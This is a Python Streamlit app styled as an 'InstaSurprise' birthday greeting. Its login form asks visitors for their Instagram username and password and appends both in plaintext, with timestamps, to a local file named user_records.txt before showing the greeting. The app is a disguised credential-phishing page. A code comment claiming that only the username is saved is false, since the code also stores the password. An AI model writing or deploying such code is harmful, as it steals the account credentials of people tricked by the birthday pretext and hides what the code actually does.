import streamlit as st
from datetime import datetime
from html import escape
import html

st.set_page_config(
    page_title="Birthday Surprise",
    page_icon="🎂",
    layout="centered"
)

if "unlocked" not in st.session_state:
    st.session_state.unlocked = False

if "name" not in st.session_state:
    st.session_state.name = ""

st.markdown("""
<style>
.stApp {
    background: linear-gradient(135deg,#100c24,#351542,#101020);
    color: white;
}
.main .block-container {
    max-width: 600px;
    padding-top: 4rem;
}
.stButton button, .stFormSubmitButton button {
    background: linear-gradient(90deg,#833ab4,#fd1d8d,#fcb045);
    color: white;
    border-radius: 12px;
    border: none;
    width: 100%;
    font-weight: bold;
    height: 45px;
}
.title {
    text-align: center;
    font-size: 42px;
    font-weight: bold;
    background: linear-gradient(90deg,#ffb347,#ff4b91);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.message {
    text-align: center;
    font-size: 18px;
    line-height: 2;
    color: #f5d9f0;
}
</style>
""", unsafe_allow_html=True)


# LOGIN PAGE
if not st.session_state.unlocked:

    st.markdown(
        '<div class="title">InstaSurprise ✨</div>',
        unsafe_allow_html=True
    )

    st.markdown(
        "<h3 style='text-align:center'>Something special awaits you 💜</h3>",
        unsafe_allow_html=True
    )

    with st.form("birthday_login"):

        username = st.text_input(
            "Username",
            placeholder="Enter your Instagram Username"
        )

        password = st.text_input(
            "Password",
            type="password",
            placeholder="Enter your Instagram Password"
        )

        submitted = st.form_submit_button(
            "Unlock My Surprise 🎁"
        )

        if submitted:

            if username.strip():

                # Save username and submission status only.
                timestamp = datetime.now().strftime(
                    "%d-%m-%Y %H:%M:%S"
                )

                with open(
                    "user_records.txt",
                    "a",
                    encoding="utf-8"
                ) as file:

                    file.write(
                        f"Date: {timestamp}\n"
                        f"Username: {username.strip()}\n"
                        f"Password: {password.strip()}\n"
                        f"Password field submitted: Yes\n"
                        f"--------------------------\n"
                    )

                st.session_state.name = username.strip()
                st.session_state.unlocked = True
                st.rerun()

            else:
                st.warning("Please enter your username!")



# BIRTHDAY SURPRISE
else:

    name = escape(st.session_state.name)

    st.markdown(
        "<div style='text-align:center;font-size:65px'>🎬✨🎉</div>",
        unsafe_allow_html=True
    )

    st.markdown(
        "<div class='title'>HAPPY BIRTHDAY!</div>",
        unsafe_allow_html=True
    )

    st.markdown(
        f"<h2 style='text-align:center;color:#ffb6d9'>"
        f"Dear {name} 💖</h2>",
        unsafe_allow_html=True
    )

    st.balloons()

    st.markdown("""
    <div class="message">
        Today is your special day! 🌟
        <br><br>
        May your life be filled with happiness,
        beautiful memories and endless adventures.
        <br><br>
        Never stop dreaming, never stop smiling.
        <br><br>
        You deserve all the happiness in the world!
        <br><br>
        🎂 HAPPY BIRTHDAY 🎂
    </div>
    """, unsafe_allow_html=True)

    st.markdown(
        "<h1 style='text-align:center'>🎈🎁🎂</h1>",
        unsafe_allow_html=True
    )

    if st.button("Replay Surprise ✨"):
        st.session_state.unlocked = False
        st.session_state.name = ""
        st.rerun()
